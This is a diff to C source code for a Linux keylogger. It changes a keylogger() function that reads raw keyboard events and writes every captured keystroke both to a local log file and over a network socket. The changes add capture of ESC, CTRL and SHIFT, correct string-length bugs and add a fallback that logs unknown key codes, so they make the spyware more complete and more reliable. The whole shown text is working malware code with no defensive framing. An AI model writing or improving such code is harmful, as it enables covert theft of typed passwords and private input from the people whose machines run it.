@@ -15,6 +15,7 @@
 #define SA struct sockaddr
 
 char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
+char other_key[10];
 
 void keylogger(int log_file, int sockfd) {
     // Set a fd variable for the keyboard file to read from
@@ -37,8 +38,12 @@ void keylogger(int log_file, int sockfd) {
         if (event.type == EV_KEY && event.value == 0) {
             // Need to handle all special cases
             switch(event.code) {
+                case 1:
+                  write(log_file, "[ESC]", strlen("[ESC]"));
+        write(sockfd, "[ESC]", strlen("[ESC]"));
+        break;
                 case 14:
-                    write(log_file, "[DELETE]", sizeof("[DELETE]"));
+                    write(log_file, "[DELETE]", strlen("[DELETE]"));
 		    write(sockfd, "[DELETE]", strlen("[DELETE]"));
 		    break;
                 case 15:
@@ -46,9 +51,13 @@ void keylogger(int log_file, int sockfd) {
 		    write(sockfd, "\t", sizeof(char));
 		    break;
                 case 28:
-                    write(log_file, "[ENTER]", sizeof("[ENTER]"));
+                    write(log_file, "[ENTER]", strlen("[ENTER]"));
 		    write(sockfd, "[ENTER]", strlen("[ENTER]"));
 		    break;
+                case 29:
+                write(log_file, "[CTRL]", strlen("[CTRL]"));
+        write(sockfd, "[CTRL]", strlen("[CTRL]"));
+        break;
                 case 43:
                     write(log_file, "\\", sizeof(char));
 		    write(sockfd, "\\", sizeof(char));
@@ -57,9 +66,22 @@ void keylogger(int log_file, int sockfd) {
                     write(log_file, " ", sizeof(char));
 		    write(sockfd, " ", sizeof(char));
 		    break;
+                case 42:
+                    write(log_file, "[SHIFT]", strlen("[SHIFT]"));
+        write(sockfd, "[SHIFT]", strlen("[SHIFT]"));
+        break;
                 default:
+                  if(event.code <= 53){
                     write(log_file, &keys[event.code], sizeof(char));
-		    write(sockfd, &keys[event.code], sizeof(char));
+		                write(sockfd, &keys[event.code], sizeof(char));
+                  }
+                  else{
+                    int num = sprintf(other_key,"[%i]",event.code);
+                    if(num){
+                      write(log_file, other_key, num);
+                      write(sockfd, other_key, num);
+                    }
+                  }
 		    break;
             }
             i++;
